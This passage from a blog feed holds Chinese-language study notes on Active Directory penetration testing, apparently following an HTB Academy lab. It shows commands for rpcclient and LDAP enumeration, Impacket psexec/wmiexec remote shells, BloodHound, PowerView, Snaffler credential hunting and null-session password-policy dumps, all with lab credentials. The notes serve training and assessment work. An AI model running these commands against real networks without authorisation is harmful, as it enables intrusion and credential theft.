Enumeration</h4><p>在rpcclient中查看用户时，您可能会注意到每个用户旁边都有一个名为rid:的字段。相对标识符（RID）是Windows用来跟踪和识别对象的唯一标识符（以十六进制格式表示）</p><h4 id="RPCClient-User-Enumeration-By-RID"><a href="#RPCClient-User-Enumeration-By-RID" class="headerlink" title="RPCClient User Enumeration By RID"></a>RPCClient User Enumeration By RID</h4><pre><code class="shell-session">rpcclient $&gt; queryuser 0x457        User Name   :   htb-student        Full Name   :   Htb Student        Home Drive  :        Dir Drive   :        Profile Path:        Logon Script:        Description :        Workstations:        Comment     :        Remote Dial :        Logon Time               :      Wed, 02 Mar 2022 15:34:32 EST        Logoff Time              :      Wed, 31 Dec 1969 19:00:00 EST        Kickoff Time             :      Wed, 13 Sep 30828 22:48:05 EDT        Password last set Time   :      Wed, 27 Oct 2021 12:26:52 EDT        Password can change Time :      Thu, 28 Oct 2021 12:26:52 EDT        Password must change Time:      Wed, 13 Sep 30828 22:48:05 EDT        unknown_2[0..31]...        user_rid :      0x457        group_rid:      0x201        acb_info :      0x00000010        fields_present: 0x00ffffff        logon_divs:     168        bad_password_count:     0x00000000        logon_count:    0x0000001d        padding1[0..7]...        logon_hrs[0..21]...</code></pre><h4 id="Enumdomusers"><a href="#Enumdomusers" class="headerlink" title="Enumdomusers"></a>Enumdomusers</h4><pre><code class="shell-session">rpcclient $&gt; enumdomusersuser:[administrator] rid:[0x1f4]user:[guest] rid:[0x1f5]user:[krbtgt] rid:[0x1f6]user:[lab_adm] rid:[0x3e9]user:[htb-student] rid:[0x457]user:[avazquez] rid:[0x458]user:[pfalcon] rid:[0x459]user:[fanthony] rid:[0x45a]user:[wdillard] rid:[0x45b]user:[lbradford] rid:[0x45c]user:[sgage] rid:[0x45d]user:[asanchez] rid:[0x45e]user:[dbranch] rid:[0x45f]user:[ccruz] rid:[0x460]user:[njohnson] rid:[0x461]user:[mholliday] rid:[0x462]&lt;SNIP&gt;  </code></pre><h2 id="Impacket-Toolkit"><a href="#Impacket-Toolkit" class="headerlink" title="Impacket Toolkit"></a>Impacket Toolkit</h2><p> <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py">psexec.py</a></p><p>Impacket套件中最有用的工具之一是psexec.py。psexec.py是Sysinternals psexec可执行文件的克隆，但工作方式与原始文件略有不同。该工具通过将随机命名的可执行文件上载到目标主机上的ADMIN$共享来创建远程服务。然后，它通过RPC和Windows服务控制管理器注册服务。一旦建立，通信就通过命名管道进行，作为SYSTEM在受害者主机上提供一个交互式远程shell。</p><h4 id="Using-psexec-py"><a href="#Using-psexec-py" class="headerlink" title="Using psexec.py"></a>Using psexec.py</h4><pre><code class="bash">psexec.py inlanefreight.local/wley:&#39;transporter@4&#39;@172.16.5.125  </code></pre><p><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py">wmiexec.py</a></p><p>Wmiexec.py利用了一个半交互式shell，通过Windows Management Instrumentation执行命令。它不会在目标主机上丢弃任何文件或可执行文件，并且生成的日志比其他模块少。连接后，它以我们连接的本地管理员用户的身份运行（对于寻找入侵的人来说，这可能比看到SYSTEM执行许多命令更不明显）。与其他工具相比，这是一种在主机上更隐蔽的执行方法，但仍可能被大多数现代反病毒和EDR系统所捕获。我们将使用与psexec.py相同的帐户来访问主机。</p><pre><code class="bash">wmiexec.py inlanefreight.local/wley:&#39;transporter@4&#39;@172.16.5.5  </code></pre><p>请注意，此shell环境不是完全交互式的，因此发出的每个命令都将从WMI执行一个新的cmd.exe并执行您的命令。这样做的缺点是，如果警惕的防御者检查事件日志并查看事件ID 4688：已经创建了一个新进程，他们将看到一个创建的新进程来生成cmd.exe并发出命令。</p><h2 id="Windapsearch"><a href="#Windapsearch" class="headerlink" title="Windapsearch"></a>Windapsearch</h2><p><a href="https://github.com/ropnop/windapsearch">Windapsearch</a>是另一个方便的Python脚本，我们可以使用LDAP查询从Windows域中枚举用户、组和计算机。</p><p>我们使用Windapsearch有几个选项来执行标准枚举（转储用户、计算机和组）和更详细的枚举。–da（枚举域管理员组成员）选项和-PU（查找特权用户）选项。-PU选项很有趣，因为它将对具有嵌套组成员身份的用户执行递归搜索。</p><h4 id="Windapsearch-Domain-Admins"><a href="#Windapsearch-Domain-Admins" class="headerlink" title="Windapsearch - Domain Admins"></a>Windapsearch - Domain Admins</h4><pre><code class="shell-session">Tanin@htb[/htb]$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da</code></pre><p>为了识别更多的潜在用户，我们可以使用-PU标志运行该工具，并检查是否有可能未被注意到的特权提升的用户。这是一个很好的报告检查，因为它很可能会通知客户具有嵌套组成员资格的多余权限的用户。</p><h4 id="Windapsearch-Privileged-Users"><a href="#Windapsearch-Privileged-Users" class="headerlink" title="Windapsearch - Privileged Users"></a>Windapsearch - Privileged Users</h4><pre><code class="shell-session">Tanin@htb[/htb]$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU</code></pre><pre><code class="shell-session">&lt;SNIP&gt;[+] Using DN: CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL[+]     Found 3 nested users for group Enterprise Admins:cn: AdministratoruserPrincipalName: administrator@inlanefreight.localcn: lab_admcn: Sharepoint AdminuserPrincipalName: sp-admin@INLANEFREIGHT.LOCAL&lt;SNIP&gt;</code></pre><h2 id="Bloodhound-py"><a href="#Bloodhound-py" class="headerlink" title="Bloodhound.py"></a>Bloodhound.py</h2><p>BloodHound是有史以来发布的用于审计Active Directory安全性的最具影响力的工具之一，它对我们作为渗透测试人员来说非常有益。我们可以获取大量耗时的数据，以筛选和创建图形表示或特定用户访问可能导致的“攻击路径”。</p><p>该工具从AD收集数据，如用户、组、计算机、组成员资格、GPO、ACL、域信任、本地管理员访问、用户会话、计算机和用户属性、RDP访问、WinRM访问等。 它最初只与PowerShell收集器一起发布，因此必须从Windows主机上运行。最终，一个社区成员发布了一个Python端口（需要Impacket、ldap3和dnspython）。当我们有有效的域凭据，但没有访问加入域的Windows主机的权限，或者没有运行SharpHound收集器的Windows攻击主机时，这在渗透测试中帮助很大。这也有助于我们不必从域主机运行收集器，因为域主机可能会被阻止或引发警报（尽管在保护良好的环境中，即使从攻击主机运行收集器也很可能引发警报）。</p><p>该工具接受带有-c或–collectionmethod标志的各种收集方法。我们可以检索特定的数据，如用户会话、用户和组、对象属性、ACLS，或者全选以收集尽可能多的数据。（ user sessions, users and groups, object properties, ACLS,）</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo bloodhound-python -u &#39;forend&#39; -p &#39;Klmcargo2&#39; -ns 172.16.5.5 -d inlanefreight.local -c all INFO: Found AD domain: inlanefreight.localINFO: Connecting to LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCALINFO: Found 1 domainsINFO: Found 2 domains in the forestINFO: Found 564 computersINFO: Connecting to LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCALINFO: Found 2951 usersINFO: Connecting to GC LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCALINFO: Found 183 groupsINFO: Found 2 trustsINFO: Starting computer enumeration with 10 workers&lt;SNIP&gt;</code></pre><h4 id="Viewing-the-Results"><a href="#Viewing-the-Results" class="headerlink" title="Viewing the Results"></a>Viewing the Results</h4><h4 id="Upload-the-Zip-File-into-the-BloodHound-GUI"><a href="#Upload-the-Zip-File-into-the-BloodHound-GUI" class="headerlink" title="Upload the Zip File into the BloodHound GUI"></a>Upload the Zip File into the BloodHound GUI</h4><p>然后，我们可以键入sudo neo4j start来启动<a href="https://neo4j.com/">neo4j</a>服务，启动我们将加载数据的数据库，并对其运行Cypher查询。</p><p> <a href="https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/">custom Cypher queries</a></p><h1 id="Credentialed-Enumeration-from-Windows"><a href="#Credentialed-Enumeration-from-Windows" class="headerlink" title="-Credentialed Enumeration - from Windows-"></a>-Credentialed Enumeration - from Windows-</h1><h4 id="Discover-Modules"><a href="#Discover-Modules" class="headerlink" title="Discover Modules"></a>Discover Modules</h4><pre><code class="powershell-session">PS C:\htb&gt; Get-ModuleModuleType Version    Name                                ExportedCommands---------- -------    ----                                ----------------Manifest   3.1.0.0    Microsoft.PowerShell.Utility        &#123;Add-Member, Add-Type, Clear-Variable, Compare-Object...&#125;Script     2.0.0      PSReadline                          &#123;Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PS...</code></pre><h4 id="Load-ActiveDirectory-Module"><a href="#Load-ActiveDirectory-Module" class="headerlink" title="Load ActiveDirectory Module"></a>Load ActiveDirectory Module</h4><pre><code class="powershell-session">PS C:\htb&gt; Import-Module ActiveDirectoryPS C:\htb&gt; Get-Module</code></pre><p>现在我们的模块已经加载完毕，让我们开始吧。首先，我们将使用 <a href="https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-addomain?view=windowsserver2022-ps">Get-ADDomain</a>枚举有关域的一些基本信息。</p><h3 id="Get-Domain-Info"><a href="#Get-Domain-Info" class="headerlink" title="Get Domain Info"></a>Get Domain Info</h3><pre><code class="powershell-session">PS C:\htb&gt; Get-ADDomain</code></pre><p>这将打印出有用的信息，如域SID、域功能级别、任何子域等。接下来，我们将使用Get-ADUser cmdlet。我们将筛选已填充ServicePrincipalName属性的帐户。</p><h4 id="Get-ADUser"><a href="#Get-ADUser" class="headerlink" title="Get-ADUser"></a>Get-ADUser</h4><pre><code class="powershell-session">PS C:\htb&gt; Get-ADUser -Filter &#123;ServicePrincipalName -ne &quot;$null&quot;&#125; -Properties ServicePrincipalName</code></pre><p>我们可以使用ActiveDirectory模块运行的另一个有趣的检查是使用Get-ADTrust cmdlet验证域信任关系</p><h4 id="Checking-For-Trust-Relationships"><a href="#Checking-For-Trust-Relationships" class="headerlink" title="Checking For Trust Relationships"></a>Checking For Trust Relationships</h4><pre><code class="powershell-session">PS C:\htb&gt; Get-ADTrust -Filter *</code></pre><p>此cmdlet将打印出域具有的任何信任关系。我们可以确定它们是我们林中的信任还是与其他林中的域的信任、信任类型、信任方向以及与之相关的域的名称。这将在以后利用父子信任关系和跨林信任进行攻击时非常有用。接下来，我们可以使用Get-ADGroup cmdlet收集AD组信息。</p><h4 id="Group-Enumeration"><a href="#Group-Enumeration" class="headerlink" title="Group Enumeration"></a>Group Enumeration</h4><pre><code class="powershell-session">PS C:\htb&gt; Get-ADGroup -Filter * | select name</code></pre><p>我们可以获取结果，并将感兴趣的名称反馈到cmdlet中，以获取有关特定组的更详细信息，如下所示：</p><h4 id="Detailed-Group-Info"><a href="#Detailed-Group-Info" class="headerlink" title="Detailed Group Info"></a>Detailed Group Info</h4><pre><code class="powershell-session">PS C:\htb&gt; Get-ADGroup -Identity &quot;Backup Operators&quot;</code></pre><p>现在我们了解了更多关于该组的信息，让我们使用get-ADGroupMember cmdlet获取成员列表。</p><h3 id="Group-Membership"><a href="#Group-Membership" class="headerlink" title="Group Membership"></a>Group Membership</h3><pre><code class="powershell-session">PS C:\htb&gt; Get-ADGroupMember -Identity &quot;Backup Operators&quot;</code></pre><p>接下来，我们将介绍PowerView工具，它具有许多简化枚举和深入挖掘领域的功能。</p><h2 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h2><p><a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon">PowerView</a></p><p>PowerView是一个用PowerShell编写的工具，用于帮助我们在AD环境中获得情境感知。与BloodHound非常相似，它提供了一种识别用户在网络上登录位置的方法，枚举域信息，如用户、计算机、组、ACLS、信任、查找文件共享和密码、执行Kerberoasting等。它是一个用途广泛的工具，可以让我们深入了解客户领域的安全状况。与BloodHound相比，它需要更多的手动工作来确定域内的错误配置和关系，但如果使用得当，可以帮助我们识别细微的错误配置。</p><h4 id="Domain-User-Information"><a href="#Domain-User-Information" class="headerlink" title="Domain User Information"></a>Domain User Information</h4><pre><code class="powershell-session">PS C:\htb&gt; Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol</code></pre><h4 id="Recursive-Group-Membership"><a href="#Recursive-Group-Membership" class="headerlink" title="Recursive Group Membership"></a>Recursive Group Membership</h4><pre><code class="powershell-session">PS C:\htb&gt;  Get-DomainGroupMember -Identity &quot;Domain Admins&quot; -Recurse</code></pre><p>上面我们对DomainAdmins组进行了递归查看，以列出其成员。现在我们知道了潜在特权提升的目标。与AD PowerShell模块一样，我们还可以枚举域信任映射。</p><h4 id="Trust-Enumeration"><a href="#Trust-Enumeration" class="headerlink" title="Trust Enumeration"></a>Trust Enumeration</h4><pre><code class="powershell-session">PS C:\htb&gt; Get-DomainTrustMapping</code></pre><p>我们可以使用Test-AdminAccess功能在当前计算机或远程计算机上测试本地管理员访问。</p><h4 id="Testing-for-Local-Admin-Access"><a href="#Testing-for-Local-Admin-Access" class="headerlink" title="Testing for Local Admin Access"></a>Testing for Local Admin Access</h4><pre><code class="powershell-session">PS C:\htb&gt; Test-AdminAccess -ComputerName ACADEMY-EA-MS01ComputerName    IsAdmin------------    -------ACADEMY-EA-MS01    True </code></pre><p>上面，我们确定当前使用的用户是主机ACADEMY-EA-MS01上的管理员。我们可以对每个主机执行相同的功能，以查看我们在哪里可以进行管理访问。我们稍后将看到BloodHound执行这种检查的效果如何。现在，我们可以检查设置了SPN属性的用户，这表明该帐户可能受到Kerberoating攻击。</p><h4 id="Finding-Users-With-SPN-Set"><a href="#Finding-Users-With-SPN-Set" class="headerlink" title="Finding Users With SPN Set"></a>Finding Users With SPN Set</h4><pre><code class="powershell-session">PS C:\htb&gt; Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName</code></pre><h2 id="SharpView"><a href="#SharpView" class="headerlink" title="SharpView"></a>SharpView</h2><p>Finding Users With SPN Set</p><pre><code class="powershell-session">PS C:\htb&gt; .\SharpView.exe Get-DomainUser -Help</code></pre><pre><code class="powershell-session">PS C:\htb&gt; .\SharpView.exe Get-DomainUser -Identity forend</code></pre><h2 id="Shares"><a href="#Shares" class="headerlink" title="Shares"></a>Shares</h2><p>共享允许域中的用户快速访问与其日常角色相关的信息，并与组织共享内容。如果设置正确，域共享将要求用户加入域，并要求用户在访问系统时进行身份验证。权限也将到位，以确保用户只能访问和查看其日常角色所需的内容。过于宽松的共享可能会导致敏感信息的意外披露，尤其是那些包含医疗、法律、人事、人力资源、数据等的信息。在攻击中，获得对可以访问诸如IT&#x2F;基础设施共享之类的共享的标准域用户的控制可能导致诸如配置文件或诸如SSH密钥或密码之类的不安全存储的认证文件之类的敏感数据的泄露。我们希望发现任何类似的问题，以确保客户不会将任何数据暴露给日常工作中不需要访问的用户，并且他们符合任何法律&#x2F;法规要求（HIPAA、PCI等）。我们可以使用PowerView查找共享，然后帮助我们挖掘共享，或者使用各种手动命令查找常见字符串，如输入名称。这可能是一个乏味的过程，我们可能会错过一些东西，尤其是在大型环境中。现在，让我们花一些时间来探索Snafler工具，看看它如何帮助我们更准确、更高效地识别这些问题。</p><h2 id="Snaffler"><a href="#Snaffler" class="headerlink" title="Snaffler"></a>Snaffler</h2><p><a href="https://github.com/SnaffCon/Snaffler">Snaffler</a>是一种可以帮助我们在Active Directory环境中获取凭据或其他敏感数据的工具。Snafler的工作原理是获取域中的主机列表，然后枚举这些主机以获得共享和可读目录。一旦完成，它就会遍历用户可读的任何目录，并寻找可以帮助我们在评估中更好定位的文件。Snafler要求从加入域的主机或在域用户上下文中运行。 要执行Snafler，我们可以使用以下命令：</p><h4 id="Snaffler-Execution"><a href="#Snaffler-Execution" class="headerlink" title="Snaffler Execution"></a>Snaffler Execution</h4><pre><code class="bash">Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data</code></pre><p>-s命令告诉它为我们将结果打印到控制台，-d指定要在其中搜索的域，-o命令则告诉Snafler将结果写入日志文件。-v选项是详细级别。通常，数据是最好的，因为它只在屏幕上显示结果，所以开始查看工具运行更容易。Snafler可以产生大量的数据，所以我们通常应该输出到文件中，让它运行，然后再返回。在渗透测试期间，将Snafler原始输出作为补充数据提供给客户也很有帮助，因为这可以帮助他们锁定应该首先锁定的高价值股票。</p><pre><code class="powershell-session">PS C:\htb&gt; .\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data</code></pre><p>我们可能会找到密码、SSH密钥、配置文件或其他可用于进一步访问的数据。Snafler为我们对输出进行颜色编码，并为我们提供共享中文件类型的概要。 既然我们有了关于INLANEFREIGHT.LOCAL域的丰富数据（希望能清除注释和日志文件输出！），我们需要一种方法来关联它并将其可视化。让我们深入了解BloodHound，看看这个工具在任何以AD为中心的安全评估中有多强大。</p><h3 id="BloodHound"><a href="#BloodHound" class="headerlink" title="BloodHound"></a>BloodHound</h3><p>Bloodhound是一款出色的开源工具，可以通过分析对象之间的关系来识别AD环境中的攻击路径。</p><p>我们必须从位于网络内（但未加入域）的Windows攻击主机中作为域用户进行身份验证，或者将工具转移到加入域的主机。</p><h4 id="SharpHound-in-Action"><a href="#SharpHound-in-Action" class="headerlink" title="SharpHound in Action"></a>SharpHound in Action</h4><pre><code class="powershell-session">PS C:\htb&gt;  .\SharpHound.exe --help</code></pre><p>我们将从MS01攻击主机运行SharpHound.exe收集器开始。</p><pre><code class="powershell-session">PS C:\htb&gt; .\SharpHound.exe -c All --zipfilename ILFREIGHT</code></pre><p>接下来，我们可以将数据集过滤到我们自己的虚拟机中，或者将其吸收到MS01上的BloodHound GUI工具中。</p><p>有时，我们会看到主机不再通电，但仍显示为AD中的记录。在报告中提出建议之前，我们应该始终验证它们是否“活动”。我们可能会为遗留操作系统写一个高风险的发现，或者为清理AD中的旧记录写一个最佳实践建议。</p>]]></content>
    
    
    <summary type="html">&lt;ul&gt;
&lt;li&gt;Deeper Down the Rabbit Hole&lt;ul&gt;
&lt;li&gt;认证枚举&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cooking with Fire&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
    <category term="AD" scheme="https://taninluv.github.io/tags/AD/"/>
    
  </entry>
  
  <entry>
    <title>AD_2</title>
    <link href="https://taninluv.github.io/2023/09/24/AD-2/"/>
    <id>https://taninluv.github.io/2023/09/24/AD-2/</id>
    <published>2023-09-24T09:12:45.000Z</published>
    <updated>2023-10-03T03:52:18.083Z</updated>
    
    <content type="html"><![CDATA[<ul><li>Sighting In, Hunting For A User</li><li>Spray Responsibly</li></ul><span id="more"></span><h2 id="Enumerating-the-Password-Policy-from-Linux-Credentialed"><a href="#Enumerating-the-Password-Policy-from-Linux-Credentialed" class="headerlink" title="Enumerating the Password Policy - from Linux - Credentialed"></a>Enumerating the Password Policy - from Linux - Credentialed</h2><p>我们可以通过多种方式提取域密码策略，具体取决于域的配置方式以及我们是否具有有效的域凭据。使用有效的域凭据，还可以使用CrackMapExec或rpcclient等工具远程获取密码策略。</p><pre><code class="shell-session">Tanin@htb[/htb]$ crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-polSMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123 SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Dumping password info for domain: INLANEFREIGHTSMB         172.16.5.5      445    ACADEMY-EA-DC01  Minimum password length: 8SMB         172.16.5.5      445    ACADEMY-EA-DC01  Password history length: 24SMB         172.16.5.5      445    ACADEMY-EA-DC01  Maximum password age: Not SetSMB         172.16.5.5      445    ACADEMY-EA-DC01  SMB         172.16.5.5      445    ACADEMY-EA-DC01  Password Complexity Flags: 000001SMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Refuse Password Change: 0SMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Password Store Cleartext: 0SMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Password Lockout Admins: 0SMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Password No Clear Change: 0SMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Password No Anon Change: 0SMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Password Complex: 1SMB         172.16.5.5      445    ACADEMY-EA-DC01  SMB         172.16.5.5      445    ACADEMY-EA-DC01  Minimum password age: 1 day 4 minutes SMB         172.16.5.5      445    ACADEMY-EA-DC01  Reset Account Lockout Counter: 30 minutes SMB         172.16.5.5      445    ACADEMY-EA-DC01  Locked Account Duration: 30 minutes SMB         172.16.5.5      445    ACADEMY-EA-DC01  Account Lockout Threshold: 5SMB         172.16.5.5      445    ACADEMY-EA-DC01  Forced Log off Time: Not Set</code></pre><h2 id="Enumerating-the-Password-Policy-from-Linux-SMB-NULL-Sessions"><a href="#Enumerating-the-Password-Policy-from-Linux-SMB-NULL-Sessions" class="headerlink" title="Enumerating the Password Policy - from Linux - SMB NULL Sessions"></a>Enumerating the Password Policy - from Linux - SMB NULL Sessions</h2><blockquote><p>SMB NULL Sessions（SMB空会话）是指在Microsoft Windows网络中的SMB（Server Message Block）协议中，允许未经身份验证的访问网络共享资源的一种机制。这是一种安全性问题，因为未经身份验证的用户可以访问共享文件夹和其他资源，可能导致潜在的安全风险和信息泄露。</p></blockquote><p>如果&#x3D;&#x3D;没有凭据&#x3D;&#x3D;，我们可以通过SMB NULL会话或LDAP匿名绑定获取密码策略。第一种是通过SMB NULL会话。SMB NULL会话允许未经身份验证的攻击者从域中检索信息，例如用户、组、计算机、用户帐户属性和域密码策略的完整列表。SMB NULL会话配置错误通常是由于旧版域控制器升级到位，最终导致不安全的配置，而这些配置默认存在于旧版本的Windows Server中。 在早期版本的Windows Server中创建域时，会向某些共享授予匿名访问权限，从而允许域枚举。SMB NULL会话可以轻松枚举。对于枚举，我们可以使用enum4linux、CrackMapExec、rpcclient等工具。 我们可以使用rpcclient检查域控制器的SMB NULL会话访问。 连接后，我们可以发出一个RPC命令，如querydominfo，以获取有关域的信息并确认NULL会话访问。</p><h4 id="Using-rpcclient"><a href="#Using-rpcclient" class="headerlink" title="Using rpcclient"></a>Using rpcclient</h4><pre><code class="shell-session">Tanin@htb[/htb]$ rpcclient -U &quot;&quot; -N 172.16.5.5rpcclient $&gt; querydominfoDomain:INLANEFREIGHTServer:Comment:Total Users:3650Total Groups:0Total Aliases:37Sequence No:1Force Logoff:-1Domain Server State:0x1Server Role:ROLE_DOMAIN_PDCUnknown 3:0x1</code></pre><h4 id="Obtaining-the-Password-Policy-using-rpcclient"><a href="#Obtaining-the-Password-Policy-using-rpcclient" class="headerlink" title="Obtaining the Password Policy using rpcclient"></a>Obtaining the Password Policy using rpcclient</h4><pre><code class="shell-session">rpcclient $&gt; querydominfoDomain:INLANEFREIGHTServer:Comment:Total Users:3650Total Groups:0Total Aliases:37Sequence No:1Force Logoff:-1Domain Server State:0x1Server Role:ROLE_DOMAIN_PDCUnknown 3:0x1rpcclient $&gt; getdompwinfomin_password_length: 8password_properties: 0x00000001    DOMAIN_PASSWORD_COMPLEX</code></pre><h4 id="Using-enum4linux"><a href="#Using-enum4linux" class="headerlink" title="Using enum4linux"></a>Using enum4linux</h4><pre><code class="shell-session">Tanin@htb[/htb]$ enum4linux -P 172.16.5.5&lt;SNIP&gt; ================================================== |    Password Policy Information for 172.16.5.5    | ================================================== [+] Attaching to 172.16.5.5 using a NULL share[+] Trying protocol 139/SMB...    [!] Protocol failed: Cannot request session (Called Name:172.16.5.5)[+] Trying protocol 445/SMB...[+] Found domain(s):    [+] INLANEFREIGHT    [+] Builtin[+] Password Info for Domain: INLANEFREIGHT    [+] Minimum password length: 8    [+] Password history length: 24    [+] Maximum password age: Not Set    [+] Password Complexity Flags: 000001        [+] Domain Refuse Password Change: 0        [+] Domain Password Store Cleartext: 0        [+] Domain Password Lockout Admins: 0        [+] Domain Password No Clear Change: 0        [+] Domain Password No Anon Change: 0        [+] Domain Password Complex: 1    [+] Minimum password age: 1 day 4 minutes     [+] Reset Account Lockout Counter: 30 minutes     [+] Locked Account Duration: 30 minutes     [+] Account Lockout Threshold: 5    [+] Forced Log off Time: Not Set[+] Retieved partial password policy with rpcclient:Password Complexity: EnabledMinimum Password Length: 8enum4linux complete on Tue Feb 22 17:39:29 2022</code></pre><p>工具<a href="https://github.com/cddmp/enum4linux-ng">enum4linux-ng</a>是对Python中enum4linux的重写，但具有其他功能，如将数据导出为YAML或JSON文件的能力，这些文件稍后可用于进一步处理数据或将其提供给其他工具。除其他功能外，它还支持彩色输出</p><h4 id="Using-enum4linux-ng"><a href="#Using-enum4linux-ng" class="headerlink" title="Using enum4linux-ng"></a>Using enum4linux-ng</h4><pre><code class="shell-session">Tanin@htb[/htb]$ enum4linux-ng -P 172.16.5.5 -oA ilfreightENUM4LINUX - next generation&lt;SNIP&gt; =======================================|    RPC Session Check on 172.16.5.5    | =======================================[*] Check for null session[+] Server allows session using username &#39;&#39;, password &#39;&#39;[*] Check for random user session[-] Could not establish random user session: STATUS_LOGON_FAILURE =================================================|    Domain Information via RPC for 172.16.5.5    | =================================================[+] Domain: INLANEFREIGHT[+] SID: S-1-5-21-3842939050-3880317879-2865463114[+] Host is part of a domain (not a workgroup) =========================================================|    Domain Information via SMB session for 172.16.5.5    |========================================================[*] Enumerating via unauthenticated SMB session on 445/tcp[+] Found domain information via SMBNetBIOS computer name: ACADEMY-EA-DC01NetBIOS domain name: INLANEFREIGHTDNS domain: INLANEFREIGHT.LOCALFQDN: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL =======================================|    Policies via RPC for 172.16.5.5    | =======================================[*] Trying port 445/tcp[+] Found policy:domain_password_information:  pw_history_length: 24  min_pw_length: 8  min_pw_age: 1 day 4 minutes  max_pw_age: not set  pw_properties:  - DOMAIN_PASSWORD_COMPLEX: true  - DOMAIN_PASSWORD_NO_ANON_CHANGE: false  - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false  - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false  - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false  - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: falsedomain_lockout_information:  lockout_observation_window: 30 minutes  lockout_duration: 30 minutes  lockout_threshold: 5domain_logoff_information:  force_logoff_time: not setCompleted after 5.41 seconds</code></pre><h4 id="Displaying-the-contents-of-ilfreight-json"><a href="#Displaying-the-contents-of-ilfreight-json" class="headerlink" title="Displaying the contents of ilfreight.json"></a>Displaying the contents of ilfreight.json</h4><pre><code class="shell-session">Tanin@htb[/htb]$ cat ilfreight.json &#123;    &quot;target&quot;: &#123;        &quot;host&quot;: &quot;172.16.5.5&quot;,        &quot;workgroup&quot;: &quot;&quot;    &#125;,    &quot;credentials&quot;: &#123;        &quot;user&quot;: &quot;&quot;,        &quot;password&quot;: &quot;&quot;,        &quot;random_user&quot;: &quot;yxditqpc&quot;    &#125;,    &quot;services&quot;: &#123;        &quot;SMB&quot;: &#123;            &quot;port&quot;: 445,            &quot;accessible&quot;: true        &#125;,        &quot;SMB over NetBIOS&quot;: &#123;            &quot;port&quot;: 139,            &quot;accessible&quot;: true        &#125;    &#125;,    &quot;smb_dialects&quot;: &#123;        &quot;SMB 1.0&quot;: false,        &quot;SMB 2.02&quot;: true,        &quot;SMB 2.1&quot;: true,        &quot;SMB 3.0&quot;: true,        &quot;SMB1 only&quot;: false,        &quot;Preferred dialect&quot;: &quot;SMB 3.0&quot;,        &quot;SMB signing required&quot;: true    &#125;,    &quot;sessions_possible&quot;: true,    &quot;null_session_possible&quot;: true,&lt;SNIP&gt;</code></pre><h2 id="Enumerating-Null-Session-from-Windows"><a href="#Enumerating-Null-Session-from-Windows" class="headerlink" title="Enumerating Null Session - from Windows"></a>Enumerating Null Session - from Windows</h2><p>从Windows进行这种类型的空会话攻击并不常见，但我们可以使用命令<code>net use \\host\ipc$“”/u:“”</code>从Windows机器建立一个空会话，并确认我们是否可以执行更多这种类型的攻击。</p><h4 id="Establish-a-null-session-from-windows"><a href="#Establish-a-null-session-from-windows" class="headerlink" title="Establish a null session from windows"></a>Establish a null session from windows</h4><pre><code class="cmd-session">C:\htb&gt; net use \\DC01\ipc$ &quot;&quot; /u:&quot;&quot;The command completed successfully.</code></pre><h2 id="Enumerating-the-Password-Policy-from-Linux-LDAP-Anonymous-Bind"><a href="#Enumerating-the-Password-Policy-from-Linux-LDAP-Anonymous-Bind" class="headerlink" title="Enumerating the Password Policy - from Linux - LDAP Anonymous Bind"></a>Enumerating the Password Policy - from Linux - LDAP Anonymous Bind</h2><p>LDAP匿名绑定允许未经身份验证的攻击者从域中检索信息，例如用户、组、计算机、用户帐户属性和域密码策略的完整列表。这是一种旧式配置，从Windows Server 2003开始，只有经过身份验证的用户才能启动LDAP请求。我们仍然不时看到这种配置，因为管理员可能需要设置一个特定的应用程序来允许匿名绑定，并提供超过预期数量的访问权限，从而允许未经身份验证的用户访问AD中的所有对象。 使用LDAP匿名绑定，我们可以使用特定于LDAP的枚举工具，如windapsearch.py、ldapsearch、ad-ldapdomaindump.py等，来提取密码策略。使用 <a href="https://linux.die.net/man/1/ldapsearch">ldapsearch</a>，它可能有点麻烦，但可行。获取密码策略的一个示例命令如下：</p><h4 id="Using-ldapsearch"><a href="#Using-ldapsearch" class="headerlink" title="Using ldapsearch"></a>Using ldapsearch</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ldapsearch -h 172.16.5.5 -x -b 